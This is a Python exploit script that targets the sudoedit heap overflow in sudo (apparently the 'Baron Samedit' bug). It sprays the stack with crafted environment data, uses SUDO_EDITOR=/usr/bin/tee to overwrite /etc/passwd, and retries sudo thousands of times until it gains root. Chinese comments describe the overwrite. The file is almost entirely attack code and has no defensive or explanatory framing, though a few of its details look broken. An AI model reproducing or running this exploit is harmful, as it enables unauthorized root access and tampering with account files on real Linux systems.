#!/usr/bin/python
import os
import sys
import resource
from struct import pack
from ctypes import cdll, c_char_p, POINTER

SUDO_PATH = b"/usr/bin/sudo"

PASSWD_PATH = '/etc/passwd'
APPEND_CONTENT = b"""\n""";

STACK_ADDR_PAGE = 0x7fffe5d35000

libc = cdll.LoadLibrary("libc.so.6")
libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)


def execve(filename, cargv, cenvp):
    libc.execve(filename, cargv, cenvp)


def spawn_raw(filename, cargv, cenvp):
    pid = os.fork()
    if pid:
        _, exit_code = os.waitpid(pid, 0)
        return exit_code
    else:
        execve(filename, cargv, cenvp)
        exit(0)


def spawn(filename, argv, envp):
    cargv = (c_char_p * len(argv))(*argv)
    cenvp = (c_char_p * len(env))(*env)
    return spawn_raw(filename, cargv, cenvp)


resource.setrlimit(resource.RLIMIT_STACK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))

TARGET_CMND_SIZE = 0x1b50

argv = ["sudoedit", "-A", "-s", PASSWD_PATH, "A" * (TARGET_CMND_SIZE - 0x10 - len(PASSWD_PATH) - 1) + "\\", None]

SA = STACK_ADDR_PAGE

ADDR_REFSTR = pack('<Q', SA + 0x20)

ADDR_PRIV_PREV = pack('<Q', SA + 0x10)
ADDR_CMND_PREV = pack('<Q', SA + 0x18)
ADDR_MEMBER_PREV = pack('<Q', SA + 0x20)

ADDR_DEF_VAR = pack('<Q', SA + 0x10)
ADDR_DEF_BINDING = pack('<Q', SA + 0x30)

OFFSET = 0x30 + 0x20
ADDR_USER = pack('<Q', SA + OFFSET)
ADDR_MEMBER = pack('<Q', SA + OFFSET + 0x40)
ADDR_CMND = pack('<Q', SA + OFFSET + 0x40 + 0x30)
ADDR_PRIV = pack('<Q', SA + OFFSET + 0x40 + 0x30 + 0x60)

# for spraying
epage = [
    'A' * 0x8 +


    '\x21', '', '', '', '', '', '',
    ADDR_PRIV[:6], '',
    ADDR_CMND[:6], '',
    ADDR_MEMBER[:6], '',


    '\x21', '', '', '', '', '', '',
    '', '', '', '', '', '', '', '',
    'A' * 0x10 +


    '\x41', '', '', '', '', '', '',
    '', '', '', '', '', '', '', '',
    'A' * 8 +
    '', '', '', '', '', '', '', '',
    ADDR_MEMBER[:6] + '', '',
    '', '', '', '', '', '', '', '',
    ADDR_PRIV[:6] + '', '',
    '', '', '', '', '', '', '', '',


    '\x31', '', '', '', '', '', '',
    'A' * 8 +
    ADDR_MEMBER_PREV[:6], '',
    'A' * 8 +
    pack('<H', 284), '',
    'A' * 0xc +


    '\x61' * 0x8 +
    'A' * 0x8 +
    ADDR_CMND_PREV[:6], '',
    '', '', '', '', '', '', '', '',
    '', '', '', '', '', '', '', '',
    ADDR_MEMBER[:6], '',
    '\xf9' + '\xff' * 0x17 +
    '', '', '', '', '', '', '', '',
    '', '', '', '', '', '', '', '',
    'A' * 8 +


    '\x51' * 0x8 +
    'A' * 0x8 +
    ADDR_PRIV_PREV[:6], '',
    'A' * 8 +
    'A' * 8 +
    ADDR_MEMBER[:6], '',
    'A' * 8 +  #
    ADDR_CMND[:6], '',
]

cnt = sum(map(len, epage))
padlen = 4096 - cnt - len(epage)
epage.append('P' * (padlen - 1))

env = [
    "A" * (7 + 0x4010 + 0x110) +
    "\x21\\", "\\", "\\", "\\", "\\", "\\", "\\",
    "A" * 0x18 +

    "\x41\\", "\\", "\\", "\\", "\\", "\\", "\\",
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
    'a' * 8 +
    ADDR_DEF_VAR[:6] + '\\', '\\',
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
    ADDR_DEF_BINDING[:6] + '\\', '\\',
    ADDR_REFSTR[:6] + '\\', '\\',
    "Z" * 0x8 +
    "\x31\\", "\\", "\\", "\\", "\\", "\\", "\\",
    'C' * 0x638 +
    'B' * 0x1b0 +

    # 用curr->prev->prev->next遍历的的列表
    "\x61\\", "\\", "\\", "\\", "\\", "\\", "\\",
    ADDR_USER[:6] + '\\', '\\',
    "A" * 8 +
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
    ADDR_MEMBER[:6] + '\\', '\\',
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "",

    "LC_ALL=C",
    "SUDO_EDITOR=/usr/bin/tee",  # 覆盖 /etc/passwd
    "TZ=:",
]

ENV_STACK_SIZE_MB = 4
for i in range(ENV_STACK_SIZE_MB * 1024 / 4):
    env.extend(epage)

env[-1] = env[-1][:-len(SUDO_PATH) - 1 - 8]

env.append(None)

cargv = (c_char_p * len(argv))(*argv)
cenvp = (c_char_p * len(env))(*env)

# 这将会覆盖/etc/passwd 结合tee命令
r, w = os.pipe()
os.dup2(r, 0)
w = os.fdopen(w, 'w')
w.writelines(APPEND_CONTENT)
w.close()

null_fd = os.open('/dev/null', os.O_RDWR)
os.dup2(null_fd, 2)

for i in range(8192):
    sys.stdout.write('%d\r' % i)
    if i % 8 == 0:
        sys.stdout.flush()
    exit_code = spawn_raw(SUDO_PATH, cargv, cenvp)
    if exit_code == 0:
        print("success at %d" % i)
        break
